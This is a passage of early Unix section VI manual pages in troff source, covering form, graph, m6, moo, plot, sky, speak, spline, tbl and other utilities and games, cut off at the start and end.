If the prototype argument is missing, `{letter}' is assumed.
.s3
Basically,
.it form
is a copy process from the prototype to the output file.
If an element of the form [\fIn\fR] (where \fIn\fR is a digit from 1 to 9) is encountered,
the \fIn\fR-th
.it arg
is inserted in its place, and that argument is then
rescanned.  If [0] is encountered, the current date is inserted.  If
the desired argument has not been given, a message of the form `[\fIn\fR]:' is
typed.
The response typed in then is used for that argument.
.s3
If an element of the form [\fIname\fR] or {\fIname\fR} is encountered, the \fIname\fR is looked up in the
associative memory.  If it is found, the contents of the memory under this
\fIname\fR replaces the original element (again rescanned).  If
the \fIname\fR is not found, a message of the form `[\fIname\fR]:' is typed.
The response typed in is used for that element.  The response is
entered in the memory under the name if the name is enclosed in [ ].
The response is not entered in the memory but is remembered for the
duration of the letter if the name is enclosed in {}.
Brackets and braces may be nested.
.s3
In both of the above cases, the response is typed in by entering
arbitrary text terminated by two new lines.  Only the first of the
two new lines is passed with the text.
.s3
If one of the special characters [{]}\\ is preceded by
a \\, it loses its special character.
.s3
If a file named `forma' already exists in the user's directory, `formb' is
used as the output file and so forth to `formz'.
.s3
The file `form.m' is created if none exists.  Because form.m is
operated on by the disc allocator, it should only be changed by using
.it fed,
the form letter editor, or
.it form.
.s3
.sh FILES
form.m	associative memory
.br
form?	output file (read only)
.sh "SEE ALSO"
fed (VI), roff (I)
.sh BUGS
An unbalanced ] or } acts as an end of file but
may add a few strange entries to the associative memory.
-- /usr/man/man6/graph.6 mode=0100664 uid=3 gid=3 atime=170022352 mtime=173059782 --
.th GRAPH VI 2/20/75
.sh NAME
graph \*- draw a graph
.sh SYNOPSIS
.bd graph
[ option ] ... | plotter
.sh DESCRIPTION
.it Graph
with no options takes pairs of numbers from the
standard input as abscissas and
ordinates of a graph.
The graph is written on the standard output to be piped
to the plotter program for a particular device;
see
.it plot
(VI).
These plotters exist:
.it gsip,
for the GSI and other Diablo terminals;
.it tek,
for the Tektronix 4014 terminal;
and
.it vt0
for the on-line storage scope.
.s3
The following options are recognized,
each as a separate argument.
.s3
.lp +5 5
\fBa\fR	Supply abscissas automatically (they are missing from
the input); spacing is given by the next
argument, or is assumed to be 1 if next argument is not a number.
A second optional argument is the starting point for the
automatic abscissa.
.s3
.lp +5 5
\fBc\fR	Place character string given by next argument
at each point.
.s3
.lp +5 5
\fBd\fR	Omit connections between points. (Disconnect.)
.s3
.lp +5 5
\fBg\fIn\fR	Grid
style:
.lp +5 0
\fIn\fR=0, no grid
.lp +5 0
\fIn\fR=1, axes only
.lp +5 0
\fIn\fR=2, complete grid (default).
.s3
.lp +5 5
\fBs\fR	Save screen, don't erase before plotting.
.s3
.lp +5 5
\fBx\fR	Next 1 (or 2) arguments are lower (and upper) \fIx\fR limits.
.s3
.lp +5 5
\fBy\fR	Next 1 (or 2) arguments are lower (and upper)
\fIy\fR limits.
.s3
.lp +5 5
\fBh\fR	Next argument is fraction of space for height
.s3
.lp +5 5
\fBw\fR	Next argument is fraction of space for width.
.s3
.lp +5 5
\fBr\fR	Next argument is fraction of space to move right before plotting.
.s3
.lp +5 5
\fBu\fR	Next argument is fraction of space to move up before plotting.
.s3
.i0
Points are connected by straight line segments in the order
they appear in input.
If a specified lower limit exceeds the upper limit, or if
the automatic increment is negative, the graph is plotted
upside down.
Automatic abscissas begin with the lower \fIx\fR limit, or with 0
if no limit is specified.
Grid lines and automatically determined limits fall on round
values, however roundness
may be subverted by giving an inappropriately rounded
lower limit.
Plotting symbols specified by
.bd c
are
placed so that a small initial letter,
such as + o x, will fall
approximately on the plotting point.
.sh "SEE ALSO"
spline (VI), plot (VI)
.sh BUGS
A limit of 1000 points is enforced silently.
-- /usr/man/man6/gsi.6 mode=0100664 uid=3 gid=3 atime=170022353 mtime=173059782 --
.th GSI VI 3/20/74
.sh NAME
gsi \*- interpret extended character set on GSI terminal
.sh SYNOPSIS
.bd gsi
.sh DESCRIPTION
.it Gsi
interprets
special characters understood
by the Model 37 Teletype terminal
and turns them into the escape sequences understood
by the GSI and other Diablo-based terminals.
The things interpreted include
vertical motions and extended graphic characters.
It
is most often used
in a pipeline like
.s3
     neqn file ... | nroff | gsi
.sh "SEE ALSO"
greek (V)
.sh BUGS
Some funny characters can't be correctly printed in column 1
because you can't move to the left from there.
-- /usr/man/man6/m6.6 mode=0100664 uid=3 gid=3 atime=170022360 mtime=173059782 --
.th M6 VI 2/19/74
.sh NAME
m6 \*- general purpose macroprocessor
.sh SYNOPSIS
.bd m6
[ name ]
.sh DESCRIPTION
.it M6
copies the standard input to the standard output,
with substitutions for any macro calls that appear.
When a file name argument
is given, that file is read before the standard input.
.s3
The processor is as described in the reference with these
exceptions:
.s3
.lp +2 0
.it #def,arg1,arg2,arg3:
causes \fIarg1\fP to
become a macro with defining text \fIarg2\fP and (optional) built-in serial number
\fIarg3\fP.
.s3
.it #del,arg1:
deletes the definition of macro \fIarg1\fP.
.s3
.it #end:
is not implemented.
.s3
.it #list,arg1:
sends the name of the macro designated by \fIarg1\fP to the current
destination without recognition of any warning characters;
\fIarg1\fP is 1 for the most recently defined macro, 2 for the next most recent,
and so on.
The name is taken to be empty when \fIarg1\fP doesn't make sense.
.s3
.it #warn,arg1,arg2:
replaces the old warning character \fIarg1\fP by the new warning character \fIarg2\fP.
.s3
.it #quote,arg1:
sends the definition text of macro \fIarg1\fP to the current
destination without recognition of any warning characters.
.s3
.it #serial,arg1:
delivers the built-in serial number associated
with macro \fIarg1\fP.
.s3
.it #source,arg1:
is not implemented.
.s3
.it #trace,arg1:
with \fIarg1\fP = `1'
causes a reconstruction of each later call to be placed
on the standard output with a call level number;
other values of \fIarg1\fP turn tracing off.
.i0
.s3
The built-in `warn' may be used to replace inconvenient warning characters.
The example below replaces `#' `:' `<' `>' by `[' `]' `{' `}'.
.s3
.lp +10 0
.nf
#warn,<#>,[:
[warn,<:>,]:
[warn,[substr,<<>>,1,1\fB;\fP,{]
[warn,[substr,{{>>,2,1\fB;\fP,}]
[now,{calls look like this}]
.fi
.i0
.s3
Every built-in function has a serial number, which specifies the action
to be performed before the defining text is expanded.
The serial numbers are:
1 gt,
2 eq,
3 ge,
4 lt,
5 ne,
6 le,
7 seq,
8 sne,
9 add,
10 sub,
11 mpy,
12 div,
13 exp,
20 if,
21 def,
22 copy,
23 warn,
24 size,
25 substr,
26 go,
27 gobk,
28 del,
29 dnl,
32 quote,
33 serial,
34 list,
35 trace.
Serial number 0
specifies no built-in action.
.sh "SEE ALSO"
A. D. Hall, M6 Reference Manual.
Computer Science Technical Report #2, Bell Laboratories, 1969.
.sh DIAGNOSTICS
Various table overflows and ``impossible'' conditions
result in comment and dump.
There are no diagnostics for poorly formed input.
.sh AUTHOR
M. D. McIlroy
.sh BUGS
Provision should be made to extend tables as needed,
instead of wasting a big fixed core allocation.
You get what the PDP11 gives you for arithmetic.
-- /usr/man/man6/moo.6 mode=0100664 uid=3 gid=3 atime=170022362 mtime=173059782 --
.th MOO VI 11/1/73
.sh NAME
moo \*- guessing game
.sh SYNOPSIS
.bd /usr/games/moo
.sh DESCRIPTION
.it Moo
is a guessing game imported from England.
The computer picks a number consisting
of four distinct decimal digits.
The player guesses four distinct digits
being scored on each guess.
A `cow' is a correct digit in an incorrect position.
A `bull' is a correct digit in a correct position.
The game continues until the player guesses the number
(a score of four bulls).
.sh BUGS
-- /usr/man/man6/plot.6 mode=0100664 uid=3 gid=3 atime=170022368 mtime=173059782 --
.th PLOT VI 3/10/75
.sh NAME
plot: tek, gsip, vt0 \*- graphics filters
.sh SYNOPSIS
source |
.bd tek
.br
source |
.bd gsip
.br
source |
.bd vt0
.sh DESCRIPTION
These commands produce graphical output on the Tektronix 4014 terminal,
the GSI or other Diablo-mechanism terminals,
and the on-line storage scope respectively.
They read the standard input to obtain
plotting instructions,
which are usually generated by a program
calling the graphics subroutines
described in
.it plot
(VII).
Each instruction consists of an ASCII letter
usually followed by binary information.
A plotting coordinate is transmitted
as four bytes representing
the
.it x
and
.it y
values;
each value
is a signed number transmitted low-order byte first.
The assumed plotting space is set by request.
The instructions are taken from
.s3
.lp +3 3
m	move: the next four bytes specify the coordinates of a point
to move to.
This is used before writing a label.
.s3
.lp +3 3
p	point: the next four bytes specify the coordinates at which a point is drawn.
.s3
.lp +3 3
l	line: the next eight bytes are taken as two pairs of coordinates
specifying the endpoints of a line to be drawn.
.s3
.lp +3 3
t	label: the bytes up to a new-line are written as ASCII
starting at the last point drawn or moved to.
.s3
.lp +3 3
a	arc:
the first four bytes specify the center, the next four specify the
starting point,
and the last four specify the end point of a circular arc.
The least significant coordinate of the end point is
used only to determine the quadrant.
The arc is drawn counter-clockwise.
This command is not necessarily implemented on all
(or even any)
of the output devices.
.s3
.lp +3 3
c	circle:
The first four bytes specify the center of the circle,
the next two the radius.
.s3
.lp +3 3
e	erases the screen
.s3
.lp +3 3
f	linemod: takes the following string as the type for all
future lines.
The types are
`dotted,'
`solid,' `longdashed,' `shortdashed,' and `dotdashed.'
This instruction is effective only with the Tektronix
terminal.
.s3
.lp +3 3
d	dotline: takes the first four bytes as the coordinates
of the beginning of a dotted line.
The next two are a signed x-increment, and the next two
are a word count.
Following are the indicated number of byte-pairs
representing words.
For each bit in this list of words a point is plotted
which is visible if the bit is `1,' invisible if not.
Each point is offset rightward by the x-increment.
The instruction is effective only on the vt0 scope.
.s3
.i0
.sh "SEE ALSO"
plot (VII), graph (VI)
.sh BUGS
-- /usr/man/man6/primes.6 mode=0100664 uid=3 gid=3 atime=170022370 mtime=173059782 --
.th PRIMES VI 4/10/75
.sh NAME
primes  \*-  print all primes larger than somewhat
.sh SYNOPSIS
.bd primes
.sh DESCRIPTION
When
.it primes
is invoked, it waits for a number to be typed in.
If you type in a positive
number less than 2\u\s756\s0\d (about
.if n 7.2e16)
.if t 7.2\(mu10\u\s716\s0\d\|)
it will print all primes greater than or
equal to this number.
.sh DIAGNOSTICS
`Ouch.' for input out of range or for garbage input.
.sh BUGS
-- /usr/man/man6/quiz.6 mode=0100664 uid=3 gid=3 atime=170022372 mtime=173059782 --
.th QUIZ VI 9/7/74
.sh NAME
quiz \*- test your knowledge
.sh SYNOPSIS
.bd quiz
[
.bd \*-i
file ]
[
.bd \*-t
] [ category1 category2 ]
.sh DESCRIPTION
.it Quiz
gives associative
knowledge tests on various subjects.
It asks items chosen from
.it category1
and expects answers from
.it category2.
If no categories are specified,
.it quiz
gives instructions
and lists the available categories.
.s3
.it Quiz
tells a correct answer whenever you type
a bare newline.
At the end of input, upon interrupt,
or when questions run out,
.it quiz
reports a score and terminates.
.s3
The
.bd \*-t
flag specifies `tutorial' mode,
where missed questions are repeated
later, and material is gradually introduced as you learn.
.s3
The
.bd \*-i
flag causes the named file to be substituted for the
default index file.
The lines of these files have the  syntax:
.s3
.lp +4 0
.if t .ds v \(bv
.if n .ds v |
.tr ||
.tc
.if t .ta .75i
.if n .ta 11
.nf
line	= category newline \*v category `:' line
category	= alternate \*v category `|' alternate
alternate	= empty \*v alternate primary
primary	= character \*v `[' category `]' \*v option
option	= `{' category `}'
.s3
.i0
.fi
The first category on each
line of an index file names an information file.
The remaining categories specify the order and contents of
the data in each line of the
information file.
Information files have the same syntax.
Backslash `\\' is used as with
.it sh
(I) to quote syntactically
significant characters or to insert transparent
newlines into a line.
When either a question or its answer is empty,
.it quiz
will refrain from asking it.
.sh FILES
/usr/lib/quiz/index
.br
/usr/lib/quiz/*
.sh BUGS
-- /usr/man/man6/sky.6 mode=0100664 uid=3 gid=3 atime=170022374 mtime=173059782 --
.th SKY VI 9/22/73
.sh NAME
sky \*- obtain ephemerides
.sh SYNOPSIS
.bd sky
[
.bd \-l
]
.sh DESCRIPTION
.it Sky
predicts the apparent locations
of the Sun, the Moon, the planets out to Saturn,
stars of magnitude at least 2.5,
and certain other celestial objects.
.it Sky
reads the standard input to obtain
a GMT time typed
on one line with blanks separating
year, month number, day, hour, and minute;
if the year is missing the current year is used.
If a blank line is typed the current time is used.
The program prints the
azimuth, elevation, and magnitude
of objects which are above the horizon
at the ephemeris location of Murray Hill
at the indicated time.
The `\-l' flag causes it to ask for another location.
.s3
Placing a ``1'' input after the minute entry
causes the program to print out the Greenwich Sidereal
Time at the indicated moment and
to print for each body
its topographic right ascension and
declination as well as its azimuth and elevation.
Also, instead of the magnitude,
the semidiameter of the body, in seconds of arc, is reported.
.s3
A ``2'' after the minute entry makes the coordinate system geocentric.
.s3
The effects of atmospheric extinction
on magnitudes
are not included;
the brightest magnitudes
of variable stars are marked with ``*''.
.s3
For all bodies, the program takes into account
precession and nutation of the equinox,
annual (but not diurnal) aberration, diurnal
parallax,
and the proper motion of stars.
In no case is refraction included.
.s3
The program takes into account perturbations
of the Earth due to the Moon, Venus, Mars, and Jupiter.
The expected accuracies
are:
for the Sun and other stellar bodies
a few tenths of seconds of arc;
for the Moon (on which particular care is lavished)
likewise a few tenths of seconds.
For the Sun, Moon and stars the accuracy is sufficient
to predict the circumstances of eclipses and occultations
to within a few seconds of time.
The planets may be off by several minutes of arc.
.s3
There are lots of special options not described here, which
do things like
substituting named star catalogs,
smoothing nutation and aberration to aid generation of mean places of stars,
and making conventional adjustments to the Moon to improve
eclipse predictions.
.s3
For the most accurate use of the program it is necessary
to know that it actually runs in Ephemeris time.
.sh FILES
/usr/lib/startab, /usr/lib/moontab
.sh "SEE ALSO"
azel (VI)
.br
.ft I
American Ephemeris and Nautical Almanac,
.ft R
for the appropriate years;
also, the
.ft I
Explanatory Supplement to the American Ephemeris
and Nautical Almanac.
.ft R
.sh AUTHOR
R. Morris
.sh BUGS
-- /usr/man/man6/sno.6 mode=0100664 uid=3 gid=3 atime=170022375 mtime=173059782 --
.th SNO VI 2/9/73
.sh NAME
sno \*- Snobol interpreter
.sh SYNOPSIS
.bd sno
[ file ]
.sh DESCRIPTION
.it Sno
is a Snobol III (with slight differences)
compiler and interpreter.
.it Sno
obtains input from the
concatenation of
.it file
and the standard input.
All input through a statement
containing the label `end' is
considered program and is compiled.
The rest is available to `syspit'.
.s3
.it Sno
differs from Snobol III in the following ways.
.s3
There are no unanchored searches.
To get the same effect:
.s3
	a ** b		unanchored search for b
.br
	a *x* b = x c	unanchored assignment
.s3
There is no back referencing.
.s3
	x = "abc"
.br
	a *x* x		is an unanchored search for `abc'
.s3
.i0
Function declaration is different.
The function declaration is
done at compile time by the use of the label `define'.
Thus there is no ability to define functions at run time
and the use of the name `define' is preempted.
There is also no provision for automatic variables
other than the parameters.
For example:
.s3
.lp +8 8
.bd "define	f( )"
.s3
.i0
or
.s3
.lp +8 8
.bd "define	f(a,b,c)"
.s3
.i0
All labels except `define' (even `end')
must have a non-empty statement.
.s3
If `start' is a label in the program,
program execution will start there.
If not, execution begins with the first
executable statement.
`define' is not an executable statement.
.s3
There are no builtin functions.
.s3
Parentheses for arithmetic are not needed.
Normal precedence applies.
Because of this, the arithmetic
operators `/' and `*'
must be set off by space.
.s3
The right side of assignments
must be non-empty.
.s3
Either \*a or " may be used for literal quotes.
.s3
The pseudo-variable `sysppt' is not available.
.sh "SEE ALSO"
Snobol III manual.
(JACM;
Vol. 11 No. 1; Jan 1964; pp 21)
.sh BUGS
-- /usr/man/man6/speak.6 mode=0100664 uid=3 gid=3 atime=170022376 mtime=173059782 --
.th SPEAK VI 4/26/75
.if t .ds A \o"a\(ga"
.if n .ds A a`
.if t .ds v \|\(bv
.sh NAME
speak \*- word to voice translator
.sh SYNOPSIS
.bd speak
[
.bd \*-efpsv
] [ vocabulary 
[
output ]
]
.sh DESCRIPTION
.it Speak
turns a stream of words
into utterances and outputs them to a voice synthesizer,
or to the specified
.it output.
It has facilities for maintaining a vocabulary.
It receives, from the standard input 
.s3
.lp +5 3
\*-	working lines: text of words separated by blanks
.lp +5 3
\*-	phonetic lines: strings of phonemes for one word preceded
and separated by commas.
The phonemes may be followed by comma-percent then a `replacement
part' \*- an ASCII string with no spaces.
The phonetic code is given in 
.it vs
(V).
.lp +5 3
\*-	empty lines
.lp +5 3
\*-	command lines: beginning with
.bd !.
The following command lines
are recognized:
.s3
.lp +15 10
\fB!r\fR file	replace coded vocabulary from file
.lp +15 10
\fB!w\fR file	write coded vocabulary on file
.lp +15 10
\fB!p\fR	print phonetics for working word
.lp +15 10
\fB!l\fR	list vocabulary on standard output with phonetics
.lp +15 10
\fB!c\fR word	copy phonetics from working word to
specified word
.lp +15 10
\fB!d\fR	print decomposition of working word into substrings
.lp +15 10
\fB!f\fI n\fR	turn off (or on) English preprocessing rule number
.it n
(see listing for meaning of
.it n)
.s3
.i0
Each working line replaces its predecessor.
Its first word is the `working word'.
Each phonetic line replaces the phonetics stored for the
working word.
In particular, a phonetic line of comma only deletes the
entry for the working word.
Each working line, phonetic line or empty line
causes the working line to be uttered.
The process terminates at the end of input.
.s3
Unknown words are pronounced by rules, and failing that,
are spelled.
For the builtin part of
the rules, see the reference.
Spelling is done by taking each character of
the word, prefixing it with `*', and looking it up.
Unspellable words burp.
.s3
Words not found verbatim in the vocabulary
are pronounced piecewise.
First the word is bracketed by sharps:
`#...#'.
The vocabulary is then searched for
the longest fragment that matches the
beginning of the word.
The phonetic part of the phonetic string is uttered,
and the matched fragment is replaced by the replacement
part of the phonetic string, if any.
The process is repeated until the word is exhausted.
A fragment is entered into the vocabulary as a working
word prefixed by `%'.
.s3
.it Speak
is initialized with a coded vocabulary stored in file
.it /usr/lib/speak.m.
The vocabulary option substitutes a different file for
.it /usr/lib/speak.m.
Other vocabularies, to be used with
option
\fB\*-e\fR,
exist in /usr/vs/latin.m and /usr/vs/polish.m.
.s3
A set of single letter options may
appear in any order preceded by
.bd \*-.
Their meanings are:
.s3
.lp +8 4
\fBe\fR	suppress English preprocessing
.lp +8 4
\fBf\fR	equivalent to `f1, f2,...'
.lp +8 4
\fBp\fR	suppress pronunciation by rule
.lp +8 4
\fBs\fR	suppress spelling
.lp +8 4
\fBv\fR	suppress voice output
.s3
.i0
The following input will reconstitute a
coded vocabulary, `speak.m', from an ascii listing, `speak.v', that
was created using \fB!l\fR.
.s3
.lp +8 0
(cat speak.v; echo !w speak.m) \*v speak \*-v /dev/null
.s3
.i0
.sh FILES
/usr/lib/speak.m
.sh "SEE ALSO"
M. D. McIlroy, ``Synthetic English Speech by Rule,''
Computing Science Technical Report #14,
Bell Laboratories, 1973
.br
vs (V), vs (IV)
.sh BUGS
Excessively long words cause dumps.
.br
Space is not reclaimed from changed entries;
use \fB!w\fR and \fB!r\fR to effect reclamation.
.br
\fB!p\fR doesn't always work as advertised.
-- /usr/man/man6/spline.6 mode=0100664 uid=3 gid=3 atime=170022377 mtime=173059782 --
.th SPLINE VI 5/15/74
.sh NAME
spline \*- interpolate smooth curve
.sh SYNOPSIS
.bd spline
[ option ] ...
.sh DESCRIPTION
.it Spline
takes pairs of numbers from the standard input as abcissas and ordinates
of a function.
It produces a similar set, which
is approximately equally spaced and
includes the input set, on the standard output.
The cubic spline output
(R. W. Hamming,
.ft I
Numerical Methods for Scientists and Engineers,
.ft R
2nd ed., 349ff)
has two continuous derivatives,
and sufficiently many points to look smooth when plotted, for
example by
.it plot
(I).
.s3
The following options are recognized,
each as a separate argument.
.s3
.lp +5 5
\fBa\fR	Supply abscissas automatically (they are missing from
the input); spacing is given by the next
argument, or is assumed to be 1 if next argument is not a number.
.s3
.lp +5 5
\fBk\fR	The constant \fIk\fR used in the boundary value computation
.s3
.if n .ig
.ti +1.5i
.ds ' \h'-\w'\(fm\(fm'u'
.EQ
.nr 99 \n(.s
.nr 98 \n(.f
'ps 10
.ft I
.ds 11 "y\(fm\(fm
.nr 11 \w'\*(11'
.ds 12 "\*'
.nr 12 \w'\*(12'
'ps 8
.ds 13 "\fR0\fP
.nr 13 \w'\*(13'
.as 12 \v'18u'\s8\*(13\|\s10\v'-18u'
'ps 10
.nr 12 \n(12+\n(13+\w'\s8\|'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "\|\|
.nr 12 \w'\*(12'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "\|=\|
.nr 12 \w'\*(12'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "\|\|
.nr 12 \w'\*(12'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "ky\(fm\(fm
.nr 12 \w'\*(12'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "\*'
.nr 12 \w'\*(12'
'ps 8
.ds 13 "\fR1\fP
.nr 13 \w'\*(13'
.as 12 \v'18u'\s8\*(13\|\s10\v'-18u'
'ps 10
.nr 12 \n(12+\n(13+\w'\s8\|'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 ",
.nr 12 \w'\*(12'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "\|\|
.nr 12 \w'\*(12'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "\|\|
.nr 12 \w'\*(12'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "\|\|
.nr 12 \w'\*(12'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "y\(fm\(fm
.nr 12 \w'\*(12'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "\*'
.nr 12 \w'\*(12'
'ps 8
.ds 13 "n
.nr 13 \w'\*(13'
.as 12 \v'18u'\s8\*(13\|\s10\v'-18u'
'ps 10
.nr 12 \n(12+\n(13+\w'\s8\|'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "\|\|
.nr 12 \w'\*(12'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "\|=\|
.nr 12 \w'\*(12'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "\|\|
.nr 12 \w'\*(12'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "ky\(fm\(fm
.nr 12 \w'\*(12'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 12 "\*'
.nr 12 \w'\*(12'
'ps 8
.ds 13 "n\|\(mi\|\fR1\fP
.nr 13 \w'\*(13'
.as 12 \v'18u'\s8\*(13\|\s10\v'-18u'
'ps 10
.nr 12 \n(12+\n(13+\w'\s8\|'
.as 11 "\*(12
.nr 11 \w'\*(11'
.ds 11 \x'0'\fI\*(11\s\n(99\f\n(98
.ne 78u
\*(11
'ps \n(99
.ft \n(98
.EN
..
.if t .ig
.ce
(2nd deriv. at end) = k*(2nd deriv. next to end)
..
.s3
.br
is set by the next argument.
By default \fIk\fR = 0.
.s3
.lp +5 5
\fBn\fR	Space output points
so that approximately
.it n
points occur between the lower and upper
.it x
limits.
(Default
.it n
= 100.)
.s3
.lp +5 5
\fBp\fR	Make output periodic, i.e. match
derivatives at ends.
First and last input values should normally agree.
.s3
.lp +5 5
\fBx\fR	Next 
1 (or 2) arguments are lower (and upper) 
.it x
limits.
Normally these limits are calculated from the data.
Automatic abcissas start at lower limit
(default 0).
.i0
.sh "SEE ALSO"
plot (I)
.sh AUTHOR
M. D. McIlroy
.sh BUGS
A limit of 1000 input points is enforced silently.
-- /usr/man/man6/tbl.6 mode=0110664 uid=3 gid=3 atime=170022379 mtime=173059782 --
.th TBL VI 2/2/75
.sh NAME
tbl \*- format tables for nroff or troff
.sh SYNOPSIS
.bd tbl
[ files ] ...
.sh DESCRIPTION
.it Tbl
is an nroff (I)
or troff(I)
preprocessor for formatting tables.
The input files are copied to the standard output,
except for lines between .TS and .TE
command lines, which are assumed to describe tables
and reformatted.
The first line after .TS specifies
the various columns: it consists of a list of column
describers separated by blanks or tabs. Each column
describer is a character string
made up of the letters `n', `r', `c', `l' and `s',
which mean:
.lp +4 4
.sp 
c	center within the column
.lp +4 4
.if n .sp 1
.if t .sp .3
r	right-adjust
.lp +4 4
.if n .sp 1
.if t .sp .3
l	left-adjust
.lp +4 4
.if n .sp 1
.if t .sp .3
n	numerical adjustment: the units digits of numbers are aligned.
.lp +4 4
.if n .sp 1
.if t .sp .3
s	span the previous entry over this column.
.if n .sp 1
.if t .sp .3
.i0
.s3
The column describer
may be followed
by an integer
giving the number of spaces between this column and the next; 3 is default.
The describer
`ccr5' indicates that the first two lines in this column are
centered; the third and remaining lines are right-adjusted; and
the column should be separated
from the column to the right by 5 spaces.
Letting \\t represent a tab (which must be typed as a genuine tab)
the input
.s3
.nf
	.TS
	cccl sccn sscn
	Household Population
	Town\\tHouseholds
	\\tNumber\\tSize
	Bedminster\\t789\\t3.26
	Bernards Twp.\\t3087\\t3.74
	Bernardsville\\t2018\\t3.30
	Bound Brook\\t3425\\t3.04
	Branchburg\\t1644\\t3.49
	Bridgewater\\t7897\\t3.81
	Far Hills\\t240\\t3.19
	.TE
.fi
yields
.nf
.TS
.nr 49 0
.nr 50 0
.nr 47 \n(49+\w'Town'+1n
.if \n(47-\n(50 .nr 50 \n(47
.nr 47 \n(49+\w''+1n
.if \n(47-\n(50 .nr 50 \n(47
.nr 47 \n(49+\w'Bedminster'+1n
.if \n(47-\n(50 .nr 50 \n(47
.nr 47 \n(49+\w'Bernards Twp.'+1n
.if \n(47-\n(50 .nr 50 \n(47
.nr 47 \n(49+\w'Bernardsville'+1n
.if \n(47-\n(50 .nr 50 \n(47
.nr 47 \n(49+\w'Bound Brook'+1n
.if \n(47-\n(50 .nr 50 \n(47
.nr 47 \n(49+\w'Branchburg'+1n
.if \n(47-\n(50 .nr 50 \n(47
.nr 47 \n(49+\w'Bridgewater'+1n
.if \n(47-\n(50 .nr 50 \n(47
.nr 47 \n(49+\w'Far Hills'+1n
.if \n(47-\n(50 .nr 50 \n(47
.nr 30 \n(49+\w'Household Population'+1n
.nr 51 0
.nr 47 \n(50+\w'789'+4n
.if \n(47-\n(51 .nr 51 \n(47
.nr 47 \n(50+\w'3087'+4n
.if \n(47-\n(51 .nr 51 \n(47
.nr 47 \n(50+\w'2018'+4n
.if \n(47-\n(51 .nr 51 \n(47
.nr 47 \n(50+\w'3425'+4n
.if \n(47-\n(51 .nr 51 \n(47
.nr 47 \n(50+\w'1644'+4n
.if \n(47-\n(51 .nr 51 \n(47
.nr 47 \n(50+\w'7897'+4n
.if \n(47-\n(51 .nr 51 \n(47
.nr 47 \n(50+\w'240'+4n
.if \n(47-\n(51 .nr 51 \n(47
.nr 31 \n(50+\w'Households'+4n
.nr 52 0
.nr 48 \n(50+\w'Households'+0n
.if \n(48-\n(52 .nr 52 \n(48
.nr 48 \n(50+\w'Number'+0n
.if \n(48-\n(52 .nr 52 \n(48
.nr 47 \n(51+\w''+1n
.if \n(47-\n(52 .nr 52 \n(47
.nr 47 \n(51+\w''+1n
.if \n(47-\n(52 .nr 52 \n(47
.nr 47 \n(51+\w''+1n
.if \n(47-\n(52 .nr 52 \n(47
.nr 47 \n(51+\w''+1n
.if \n(47-\n(52 .nr 52 \n(47
.nr 47 \n(51+\w''+1n
.if \n(47-\n(52 .nr 52 \n(47
.nr 47 \n(51+\w''+1n
.if \n(47-\n(52 .nr 52 \n(47
.nr 47 \n(51+\w''+1n
.if \n(47-\n(52 .nr 52 \n(47
.nr 47 \n(51+\w''+1n
.if \n(47-\n(52 .nr 52 \n(47
.nr 53 0
.nr 47 \n(52+\w'3'+4n
.if \n(47-\n(53 .nr 53 \n(47
.nr 47 \n(52+\w'3'+4n
.if \n(47-\n(53 .nr 53 \n(47
.nr 47 \n(52+\w'3'+4n
.if \n(47-\n(53 .nr 53 \n(47
.nr 47 \n(52+\w'3'+4n
.if \n(47-\n(53 .nr 53 \n(47
.nr 47 \n(52+\w'3'+4n
.if \n(47-\n(53 .nr 53 \n(47
.nr 47 \n(52+\w'3'+4n
.if \n(47-\n(53 .nr 53 \n(47
.nr 47 \n(52+\w'3'+4n
.if \n(47-\n(53 .nr 53 \n(47
.nr 54 0
.nr 48 \n(52+\w'Size'+0n
.if \n(48-\n(54 .nr 54 \n(48
.nr 47 \n(53+\w''+1n
.if \n(47-\n(54 .nr 54 \n(47
.nr 47 \n(53+\w'.26'+1n
.if \n(47-\n(54 .nr 54 \n(47
.nr 47 \n(53+\w'.74'+1n
.if \n(47-\n(54 .nr 54 \n(47
.nr 47 \n(53+\w'.30'+1n
.if \n(47-\n(54 .nr 54 \n(47
.nr 47 \n(53+\w'.04'+1n
.if \n(47-\n(54 .nr 54 \n(47
.nr 47 \n(53+\w'.49'+1n
.if \n(47-\n(54 .nr 54 \n(47
.nr 47 \n(53+\w'.81'+1n
.if \n(47-\n(54 .nr 54 \n(47
.nr 47 \n(53+\w'.19'+1n
.if \n(47-\n(54 .nr 54 \n(47
.if \n(30-\n(54 .nr 54 \n(30
.if \n(31-\n(54 .nr 54 \n(31
.fc  @
.ta \n(54u 
@Household Population@   
.ta \n(50u \n(54u 
@Town@   @Households@   
.ta \n(50u \n(52u \n(54u 
@@   @Number@   @Size@   
.ta \n(50u \n(51u \n(52u \n(53u \n(54u 
Bedminster@   @789@   @3.26@   
Bernards Twp.@   @3087@   @3.74@   
Bernardsville@   @2018@   @3.30@   
Bound Brook@   @3425@   @3.04@   
Branchburg@   @1644@   @3.49@   
Bridgewater@   @7897@   @3.81@   
Far Hills@   @240@   @3.19@   
.fc
.TE
.fi
.s3
.s3
If no arguments are given,
.it tbl
reads the standard input,
so it may be used as a filter.
When it is used with
.it eqn
or
.it neqn
the
.it tbl
command should be first, to minimize the volume
of data passed through
pipes.
.sh BUGS
No column describer may end with `s'.
-- /usr/man/man6/tmg.6 mode=0100664 uid=3 gid=3 atime=170022381 mtime=173059782 --
.th TMG VI 10/21/72
.sh NAME
tmg \*- compiler-compiler
.sh SYNOPSIS
.bd tmg
name
.sh DESCRIPTION
.it Tmg
produces a translator for the language whose parsing
and translation rules are described in file \fIname\fB.t\fR.
The new translator appears
in a.out and may be used thus:
.s3
.bd a.out
input [ output ]
.s3
Except in rare cases input must be a randomly
addressable file.
